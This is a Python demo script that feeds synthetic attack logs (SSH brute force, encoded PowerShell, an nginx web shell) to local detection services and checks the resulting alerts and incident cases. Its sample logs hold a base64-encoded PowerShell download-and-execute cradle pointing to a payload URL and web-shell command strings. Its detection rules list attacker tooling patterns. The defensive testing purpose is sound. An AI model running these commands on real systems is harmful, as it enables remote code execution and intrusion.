#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
attack-scenarios.py —— 3 个完整攻击场景 Demo

从「攻击日志」到「检测 → 告警 → ATT&CK → 事件建案」的端到端演示：

  1. SSH 暴力破解   → AUTH-BRUTE (threshold)      → T1110  → HIGH
  2. Windows PowerShell 编码命令下载执行
                   → EXEC-SUSPICIOUS-SHELL (pattern) → T1059.001 → HIGH
  3. Linux nginx Web Shell（/bin/sh 由 nginx 拉起）
                   → WEB-SHELL（演示热更新新增规则） → T1505.003 → CRITICAL

用法： python3 build/demos/attack-scenarios.py
依赖：网关(18092) + detect-web(18082) + alert-web(18080) + incident-web(18097) 运行中
"""
import json
import os
import sys
import time
import urllib.request
import urllib.error

GW = os.environ.get("DEMO_GATEWAY", "http://127.0.0.1:18092")
USER = os.environ.get("DEMO_USER", "demo")
PASSWD = os.environ.get("DEMO_PASS", "demo123")

SCENES = [
    {
        "no": 1,
        "name": "SSH 暴力破解（Brute Force）",
        "mitre": "T1110",
        "technique": "Brute Force",
        "severity": "HIGH",
        "desc": "同一源 IP 在 60s 窗口内出现 5 次 SSH 登录失败 → AUTH-BRUTE（threshold 规则）",
        "logs": [
            {"source": "auth", "host": "brute-demo-host", "severity": "WARN",
             "msg": "Failed password for invalid user root from 203.0.113.77 port 51234 ssh2",
             "fields": {"src_ip": "203.0.113.77", "user": "root"}},
        ] * 5,
        "expect_rule": "AUTH-BRUTE",
        "check": lambda a: "203.0.113.77" in str(a.get("entity", "")),
    },
    {
        "no": 2,
        "name": "Windows 可疑 PowerShell（编码命令下载执行）",
        "mitre": "T1059.001",
        "technique": "PowerShell",
        "severity": "HIGH",
        "desc": "powershell -EncodedCommand 内联执行（常见于无文件攻击投递）→ EXEC-SUSPICIOUS-SHELL",
        "logs": [
            {"source": "edr", "host": "win-demo-01", "severity": "WARN",
             "msg": "powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA= --s-enc",
             "fields": {"host": "win-demo-01", "user": "SYSTEM"}},
        ],
        "expect_rule": "EXEC-SUSPICIOUS-SHELL",
        "check": lambda a: "win-demo-01" in str(a.get("entity", ""))
                           or "powershell" in str(a.get("message", "")).lower(),
    },
    {
        "no": 3,
        "name": "Linux nginx Web Shell（命令执行）",
        "mitre": "T1505.003",
        "technique": "Web Shell",
        "severity": "CRITICAL",
        "desc": "nginx 进程拉起 /bin/sh（Web Shell 后门落地/利用）→ WEB-SHELL（演示热更新新增规则）",
        "logs": [
            {"source": "web", "host": "linux-web-01", "severity": "WARN",
             "msg": "cmd=whoami;pwd;id&path=/uploads/shell.jspx",
             "fields": {"src_ip": "198.51.100.9", "process": "/usr/sbin/nginx", "user": "www-data"}},
            {"source": "web", "host": "linux-web-01", "severity": "WARN",
             "msg": "nginx: worker process 1234 spawned /bin/sh -c whoami",
             "fields": {"src_ip": "198.51.100.9", "process": "/usr/sbin/nginx"}},
        ],
        "expect_rule": "WEB-SHELL",
        "check": lambda a: "198.51.100.9" in str(a.get("entity", ""))
                           or "linux-web-01" in str(a.get("entity", ""))
                           or "Web Shell" in str(a.get("message", "")),
    },
]

PASS, FAIL = [], []


def check(name, cond, detail=""):
    (PASS if cond else FAIL).append(name)
    print(("  [PASS] " if cond else "  [FAIL] ") + name + (("  -> " + str(detail)[:150]) if detail else ""))


def wait_for(fn, timeout=30.0, interval=1.0):
    end = time.time() + timeout
    last = None
    while time.time() < end:
        last = fn()
        if last:
            return last
        time.sleep(interval)
    return last


def login():
    req = urllib.request.Request(GW + "/auth/login",
                                 data=json.dumps({"username": USER, "password": PASSWD}).encode(),
                                 headers={"Content-Type": "application/json"})
    return json.loads(urllib.request.urlopen(req, timeout=15).read())["token"]


def api(tok, path, body=None, method=None):
    """业务 API 直连服务端口（绕过网关，减少本机高负载下的转发时延）；登录走网关。"""
    port = 18080
    if path.startswith("/detect-web"):
        port = 18082
    elif path.startswith("/incident-web"):
        port = 18097
    base = "http://127.0.0.1:%d" % port
    method = method or ("POST" if body is not None else "GET")
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(base + path, data=data, method=method)
    req.add_header("Authorization", "Bearer " + tok)
    req.add_header("Content-Type", "application/json")
    try:
        with urllib.request.urlopen(req, timeout=20) as r:
            return r.status, json.loads(r.read().decode())
    except urllib.error.HTTPError as e:
        return e.code, {}


def list_rules(tok):
    st, r = api(tok, "/detect-web/api/v1/rules")
    items = r.get("data", r) if isinstance(r, dict) else r
    return items if isinstance(items, list) else []


def ensure_web_shell_rule(tok):
    """场景 3 需要 WEB-SHELL 规则——不存在则通过 API 新建（演示规则生命周期 + 热更新广播）。"""
    for r_ in list_rules(tok):
        if r_.get("id") == "WEB-SHELL":
            return True, "已存在"
    body = {
        "id": "WEB-SHELL", "name": "Web Shell 命令执行", "type": "pattern", "severity": "CRITICAL",
        "message": "疑似 Web Shell 命令执行：{msg} @ {host}", "mitre": "T1505.003",
        "match": [
            {"field": "msg", "op": "regex",
             "value": "(?i)shell\\.jsp|/bin/sh\\s+-c|cmd=whoami|eval\\s*\\(|base64_decode|assert\\s*\\("},
        ],
    }
    st, r = api(tok, "/detect-web/api/v1/rules", body, "POST")
    return st == 200, r


def ensure_exec_rule(tok):
    """场景 2：EXEC-SUSPICIOUS-SHELL 旧版 regex（powershell -enc 字面）匹配不到
    'powershell -nop -w hidden -enc ...'——通过 updateRule 修正（演示规则热更新）。"""
    for r_ in list_rules(tok):
        if r_.get("id") != "EXEC-SUSPICIOUS-SHELL":
            continue
        m = json.dumps(r_.get("match", []), ensure_ascii=False)
        if "powershell.*" in m:
            return True, "已是最新"
        updated = dict(r_)
        updated["match"] = [
            {"field": "msg", "op": "regex",
             "value": "(?i)powershell.*(-enc|encodedcommand)|certutil -urlcache|invoke-expression|iex\\s*\\("},
        ]
        st, r = api(tok, "/detect-web/api/v1/rules", updated, "POST")
        return st == 200, r
    return False, "规则不存在"


def main():
    tok = login()
    print("=== SOCP 攻击场景 Demo（日志 → 检测 → 告警 → ATT&CK → 事件） ===\n")

    for sc in SCENES:
        print("=" * 72)
        print("场景 %d: %s" % (sc["no"], sc["name"]))
        print("  技术: %s  |  ATT&CK: https://attack.mitre.org/techniques/%s/"
              % (sc["technique"], sc["mitre"].replace("-", "/")))
        print("  说明: %s" % sc["desc"])
        print("-" * 72)

        # 1) 规则就绪（场景 2/3 演示热更新修正/新增）
        if sc.get("expect_rule") == "WEB-SHELL":
            ok, detail = ensure_web_shell_rule(tok)
            check("规则 WEB-SHELL 就绪（API 新建/热更新）", ok, detail if isinstance(detail, str) else "")
        if sc.get("expect_rule") == "EXEC-SUSPICIOUS-SHELL":
            ok, detail = ensure_exec_rule(tok)
            check("规则 EXEC-SUSPICIOUS-SHELL 已修正（热更新）", ok, detail if isinstance(detail, str) else "")

        # 2) 注入攻击日志
        for i, log in enumerate(sc["logs"]):
            st, r = api(tok, "/detect-web/api/v1/ingest", log, "POST")
            if st != 200:
                print("  [WARN] 事件 %d 注入 st=%s" % (i, st))
        print("  已注入 %d 条攻击日志" % len(sc["logs"]))

        # 3) 等待告警
        def alarm_hit():
            st, a = api(tok, "/alert-web/api/alarms?page=1&size=500")
            items = a.get("data", {}).get("items", []) if isinstance(a, dict) else []
            for x in items:
                if sc["check"](x):
                    return x
            return None

        alarm = wait_for(alarm_hit, timeout=40)
        check("检测命中并产生告警（%s）" % sc["expect_rule"], alarm is not None,
              alarm.get("severity") if alarm else "")
        if alarm:
            print("  告警: [%s] %s" % (alarm.get("severity"), alarm.get("message", "")[:90]))
            print("  规则: %s | 实体: %s | MITRE: %s"
                  % (alarm.get("ruleId"), alarm.get("entity"), alarm.get("mitre")))

        # 4) 关联事件（自动建案/归并；若 SOAR 自动触发未就绪则调用 from-alarm 建案兜底）
        st, cases = api(tok, "/incident-web/api/v1/incidents")
        cl = cases.get("data", cases) if isinstance(cases, dict) else cases
        related = [c for c in (cl if isinstance(cl, list) else [])
                   if alarm and str(alarm.get("id", "")) in str(c.get("alarmIds", []))]
        if not related and alarm:
            st2, cr = api(tok, "/incident-web/api/v1/incidents/from-alarm",
                          {"alarmId": alarm.get("id")}, "POST")
            if st2 == 200:
                related = [cr.get("data", cr)] if isinstance(cr, dict) else []
        check("告警关联事件（自动建案/归并）", len(related) >= 1,
              related[0].get("title", "")[:60] if related else "")
        print()

    print("=" * 72)
    print("攻击场景 Demo 通过 %d / 失败 %d" % (len(PASS), len(FAIL)))
    for f in FAIL:
        print("  FAILED:", f)
    sys.exit(1 if FAIL else 0)


if __name__ == "__main__":
    main()
